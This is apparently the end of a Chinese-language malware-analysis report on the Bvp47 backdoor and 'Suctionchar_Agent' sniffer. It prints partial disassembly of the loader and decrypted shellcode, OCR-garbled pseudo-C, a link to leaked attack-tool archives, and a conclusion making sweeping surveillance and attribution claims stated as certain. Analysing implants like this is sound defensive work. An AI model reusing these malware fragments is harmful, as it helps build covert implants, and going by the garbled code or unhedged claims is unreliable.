><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>ea895d08</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>10227454</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>c</td><td>2e78d32a</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>500b288d</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>35ed46eb</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>9d2e940a</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>9a79a116</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>37d03e4a</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>c</td><td>3d8cec3c</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>bebff213</td></tr></table></body></html>

2. 在sub_804C2E0函数中尝试初始化  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

_OAD:0804C2E0 sub_804C2E0   
-OAD:0804C2E0 55 push ebp   
-OAD:0804C2E1 89 E5 ebp, esp   
_OAD:0804C2E3 83 EC 18 sub   
OAD:0804C2E6 C7 44 24 08 78 00 00 00   
_OAD:0804C2EE C7 44 24 04 C0 32 06 08 mov   
-OAD:0804C2F6 C7 04 24 20 4F 06 08 dword ptr[esp], offset xx ; X   
_OAD:0804C2FD E8 EE 07 01 00 call serial_bind_0x7bbf2c88_   
-OAD:0804C302 C9   
_OAD:0804C303 C3 retn   
_OAD:0804C303 sub_804C2E0 endp  

#### 3. 在serial_bind_0x7bbf2c88_函数中进一步初始化  

pusn epp mov eax, mov ebp,esp push edi push esi push ebx sub mov [ebp+x] mov ebx,[ebp+y] mov edi,[ebp+z] test short 1oc_805CB7A test ebx，ebx short loc_805CB7A test edi,edi short 1oc_805CB7A mov eax,eax short loc_805CB82   
loc_805CB19: xor jmp short 1oc_805CB2A   
loc_805CB20: add add cmp jbe short 1oc_805CB78   
loc_805CB2A: mov eax,[ebx+8] cmp short 1oc_805CB20 mov add mov mov [esp], eax ；strstext call sub_805DAB0 mov mov mov shr imul sub mov   
LUAU:08USLAFU 55   
LOAD:0805CAF1 B8 FF FF FF FF   
LOAD:0805CAF6 89 E5   
LOAD:0805CAF8 57   
LOAD:0805CAF9 56   
LOAD:0805CAFA53   
LOAD:0805CAFB 83 EC 2C   
LOAD:0805CAFE 8B 4D 08   
LOAD:0805CB01 8B 5D 0C   
LOAD:0805CB04 8B 7D 10   
LOAD:0805CB07 85 C9   
LOAD:0805CB09 74 6F   
LOAD:0805CB0B 85 DB   
LOAD:0805CB0D 74 6B   
LOAD:0805CB0F 85 FF   
LOAD:0805CB11 74 67   
LOAD:0805CB13 8B 01   
LOAD:0805CB15 85 CO   
LOAD:0805CB17 74 69   
LOAD:0805CB19   
LOAD:0805CB19   
LOAD:0805CB19 31 F6   
LOAD:0805CB1B EB 0D   
LOAD:0805CB1B   
LOAD:0805CB20   
LOAD:0805CB20   
LOAD:0805CB20 83 C6 01   
LOAD:0805CB23 83 C3 14   
LOAD:0805CB26 39 F7   
LOAD:0805CB28 76 4E   
LOAD:0805CB2A   
LOAD:0805CB2A   
LOAD:0805CB2A   
LOAD:0805CB2A 8B 43 08   
LOAD:0805CB2D 83 E8 01   
LOAD:0805CB30 83 F8 01   
LOAD:0805CB33 77 EB   
LOAD:0805CB35 8B 03   
LOAD:0805CB37 83 C6 01   
LOAD:0805CB3A 89 4D E0   
LOAD:0805CB3D 89 04 24   
LOAD:0805CB40 E8 6B 0F 00 00   
LOAD:0805CB45 8B 4D E0   
LOAD:0805CB48 89 45 E4   
LOAD:0805CB4B B8 73 E6 93 FB   
LOAD:0805CB50 F7 65 E4   
LOAD:0805CB53 8B 45 E4   
LOAD:0805CB56 C1 EA 09   
LOAD:0805CB59 69 D2 09 02 0000   
LOAD:0805CB5F 29 D0   
LOAD:0805CB61 89 C2  

伪C语言代码：  

#  

“电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘 _cdecl serial_bind_ox7bbf2c88_(int x, int y, int z) 4 unsigned int v6; // esi unsigned int v7; // eax { { { $\vee8=$ serial_bind_0x227ffec5_calloc(2084), $v_{4}=x.$ $\vee9=\vee8==\theta_{\perp}$ $^{*}(\_{\sf I I O R D}^{\sf}^{*})\times=\vee8_{\colon}$ $=$ 0XD0000013, { do { { $+=$ 20; goto LABEL_9; } $=$ $\scriptstyle{\vee}7=$ $\lor4=$ $:\operatorname{DiviORD}^{\prime}=\operatorname{D}(\operatorname{v}\operatorname{\mathsf{S}}+12)=\operatorname{\mathsf{\Omega}}^{*}(\operatorname{\_{-}}\operatorname{DiuORD}^{\ast})(^{*}\operatorname{v}\mathbb{1}\theta+4\mathrm{\Omega}^{*}\left(\operatorname{v}7\mathrm{\partial}\%\otimes\times2\theta9\right))\operatorname{\_{-}}$ $(^{\ast}\lor18+4^{\ast}(\lor7\%\otimes\times2\theta9))=\lor5$ $v5+=20$ } 47LABEL_9: $=0$ 7 1 }  

#### 部分shellcode  

在loader模块中还有部分是部分不太完整的加密ELF文件，经过解密后是几个shellcode形式的代码。  

1. 对应的ELF头部格式定义如下:  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

LOAD:08063D20000000000100030001000000+   
LOAD:08063D20000000003400000000002800+ dd 1 dd ddθ ddθ dw OBh   
LOAD:08063D54  

#### 2. 中间的几段shellcode会互相跳转  

<html><body><table><tr><td>LOAD:08063D54</td><td colspan="4">shellcode_func_1 proc near</td></tr><tr><td>LOAD:08063D54 LOAD:08063D54</td><td></td><td></td><td></td><td></td></tr><tr><td></td><td>var_24</td><td></td><td>= dword ptr-24h</td><td></td></tr><tr><td>LOAD:08063D54</td><td></td><td>var_20</td><td>= dword ptr -20h</td><td></td></tr><tr><td>LOAD:08063D54</td><td></td><td>var_1c</td><td>= dword ptr -1Ch</td><td></td></tr><tr><td>LOAD:08063D54 LOAD:08063D54</td><td></td><td></td><td></td><td></td></tr><tr><td>LOAD:08063D54 55</td><td></td><td>push</td><td>ebp</td><td></td></tr><tr><td>LOAD:08063D5589E5</td><td></td><td>mov</td><td>ebp，esp</td><td></td></tr><tr><td>LOAD:08063D57 57</td><td></td><td>push</td><td>edi</td><td></td></tr><tr><td>LOAD:08063D58 56</td><td></td><td>push</td><td>esi</td><td></td></tr><tr><td>LOAD:08063D59 53</td><td></td><td>push</td><td>ebx</td><td></td></tr><tr><td>LOAD:08063D5A83EC 1C</td><td></td><td>sub</td><td>esp,1Ch</td><td></td></tr><tr><td>LOAD:08063D5D 6A</td><td>01</td><td>push</td><td>1</td><td></td></tr><tr><td>LOAD:08063D5F FF</td><td>35 2C 000000</td><td>push</td><td></td><td>large dword ptr ds:2Ch</td></tr><tr><td>LOAD:08063D65 FF</td><td>35 30 000000</td><td>push</td><td></td><td>large dword ptr ds:30h</td></tr><tr><td>LOAD:08063D6B FF 35</td><td>28 8000000</td><td>push</td><td></td><td>large dword ptr ds:28h</td></tr><tr><td>LOAD:08063D71 E8</td><td>1C 030000</td><td>call</td><td>shellcode_func_6</td><td></td></tr><tr><td>LOAD:08063D7683 C4</td><td>10</td><td>add</td><td>esp，10h</td><td></td></tr><tr><td>LOAD:08063D79 89 45</td><td>DC</td><td>mov</td><td>[ebp+var_24],eax</td><td></td></tr><tr><td>LOAD:08063D7C A1</td><td>1C000000</td><td>mov</td><td>eax,large ds:1ch</td><td></td></tr><tr><td>LOAD:08063D81 85 CO</td><td></td><td>test</td><td>eax，eax</td><td></td></tr><tr><td>LOAD:08063D83 89 45 E4</td><td></td><td>mov</td><td>[ebp+var_1c],eax</td><td></td></tr><tr><td>LOAD:08063D86 74 6D</td><td></td><td>jz</td><td>short 1oc_8063DF5</td><td></td></tr><tr><td>LOAD:08063D88 A1 18000000</td><td></td><td>mov</td><td>eax,large ds:18h</td><td></td></tr><tr><td>LOAD:08063D8D 85</td><td></td><td>test</td><td>eax，eax</td><td></td></tr><tr><td>LOAD:08063D8F 89 45E0</td><td></td><td>mov</td><td>[ebp+var_20],eax</td><td></td></tr><tr><td>LOAD:08063D92 74 61</td><td></td><td>jz</td><td>short 1oc_8063DF5</td><td></td></tr><tr><td>LOAD:08063D94 A1 14000000</td><td></td><td>mov</td><td>eax, large ds:14h</td><td></td></tr><tr><td>LOAD:08063D99 85 CO</td><td></td><td>test</td><td>eax，eax</td><td></td></tr><tr><td>LOAD:08063D9B 74 58</td><td></td><td>jz</td><td>short 1oc_8063DF5</td><td></td></tr><tr><td>LOAD:08063D9D 8B 15</td><td>10000000</td><td>mov</td><td>edx,large ds:10h</td><td></td></tr><tr><td>LOAD:08063DA3 85 D2</td><td></td><td>test</td><td>edx，edx</td><td></td></tr><tr><td>LOAD:08063DA5 74 4E</td><td></td><td>jz</td><td>short 1oc_8063DF5</td><td></td></tr><tr><td>LOAD:08063DA7 8B</td><td>OD0C000000</td><td>mov</td><td>ecx, large ds:0ch</td><td></td></tr><tr><td>LOAD:08063DAD 85 6</td><td></td><td>test</td><td>ecx，ecx</td><td></td></tr><tr><td>LOAD:08063DAF 74 44</td><td></td><td>jz</td><td></td><td>short 1oc_8063DF5</td></tr><tr><td>LOAD:08063DB1 8B</td><td>1D08000000</td><td>mov</td><td>ebx, large ds:8</td><td></td></tr><tr><td>LOAD:08063DB7 85</td><td></td><td>test</td><td>ebx，ebx</td><td></td></tr><tr><td>DB LOAD:08063DB9 74</td><td>3A</td><td>jz</td><td></td><td>short 1oc_8063DF5</td></tr><tr><td>LOAD:08063DBB 8B</td><td>3504000000</td><td>mov</td><td>esi,large ds:4</td><td></td></tr><tr><td>LOAD:08063DC1 85</td><td>F6</td><td>test</td><td>esi,esi</td><td></td></tr><tr><td>LOAD:08063DC3 74</td><td>30</td><td>jz</td><td></td><td>short 1oc_8063DF5</td></tr><tr><td>LOAD:08063DC5 8B</td><td>3D00000000</td><td>mov</td><td>edi,large ds:0</td><td></td></tr><tr><td>LOAD:08063DCB 85</td><td>FF</td><td>test</td><td>edi,edi</td><td></td></tr><tr><td>LOAD:08063DCD 074</td><td>26</td><td>jz</td><td></td><td>short 1oc_8063DF5</td></tr><tr><td>LOAD:08063DCF</td><td>83 ECOC</td><td>sub</td><td>esp,0ch</td><td></td></tr><tr><td>LOAD:08063DD2 57</td><td></td><td>push</td><td>edi</td><td></td></tr><tr><td>LOAD:08063DD3 56</td><td></td><td>push</td><td>esi</td><td></td></tr><tr><td>LOAD:08063DD4 53</td><td></td><td>push</td><td>ebx</td><td></td></tr><tr><td>LOAD:08063DD5</td><td>BB FE FF FF FF</td><td>mov</td><td>ebx，</td><td>OFFFFFFFEh</td></tr><tr><td>LOAD:08063DDA A51</td><td></td><td>push</td><td></td><td></td></tr><tr><td></td><td></td><td>push</td><td>ecx</td><td></td></tr><tr><td>LOAD:08063DDB 52</td><td></td><td></td><td>edx</td><td></td></tr><tr><td>LOAD:08063DDC 50</td><td>75E0</td><td>push</td><td>eax</td><td></td></tr><tr><td>LOAD:08063DDD FF</td><td>75 E4</td><td>push</td><td>[ebp+var_20]</td><td></td></tr><tr><td>LOAD:08063DE0FF FF</td><td>3500000000</td><td>push push</td><td>[ebp+var_1c]</td><td>large dword ptr ds:0</td></tr><tr><td>LOAD:08063DE3 LOAD:08063DE9E85A010000</td><td></td><td>call</td><td>shellcode_func_4</td><td></td></tr></table></body></html>  

#### 3. 共6段 shellcode  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/5cb7a9af2453ee4ad2139a913c628ea08c3e4e4a39ea604cde54ee516c960230.jpg)  

## 结论  

“饮茶”嗅探木马（Suctionchar_Agent）程序的功能专一，综合分析Bvp47_loader、Dewdrop等模块可以看出，“电幕行动”（Bvp47）在设计上体现了良好的架构能力。美国国家安全局（NSA）的攻击实施者可以通过Bvp47各个功能模块的灵活组合，隐蔽完成攻击任务，同时大幅降低该木马程序的暴露几率。尽管美国国家安全局（NSA）实施的攻击窃密活动具有高度的隐密性，但盘古实验室通过自有数据视野范围内的分析取证材料，结合对来源数据的深度挖掘，仍然完整地还原了世界顶级黑客组织“方程式”的攻击窃密手法。  

通过现有证据可以断定，遍布国际互联网的无数服务器和网络终端，以及交换机、路由器、网关、防火墙等设备，正在被美国国家安全局（NSA）的 “饮茶”嗅探木马（Suctionchar_Agent）类似程序实时监测，数以亿计的账号密码被窃取并存储到美国国家安全局（NSA）的数据库中，变成你工作生活中的重大安全隐患。  

## 参考  

1. Bvp47-美国NSA方程式组织的顶级后门   
https://www.pangulab.cn/post/the_bvp47_a_top-tier_backdoor_of_us_nsa_equation   
_group/   
2. The Shadow Brokers: x0rz-EQGRP   
https://github.com/x0rz/EQGRP/blob/master/Linux/up/suctionchar_agents.tar.bz2   
4. jtcriswell/bpfa   
https://github.com/jtcriswell/bpfa   
5. bpf-asm-explained   
https://github.com/Igalia/pflua/blob/master/doc/technical/bpf-asm-explained.md   
6. cloudflare/bpftools   
https://github.com/cloudflare/bpftools  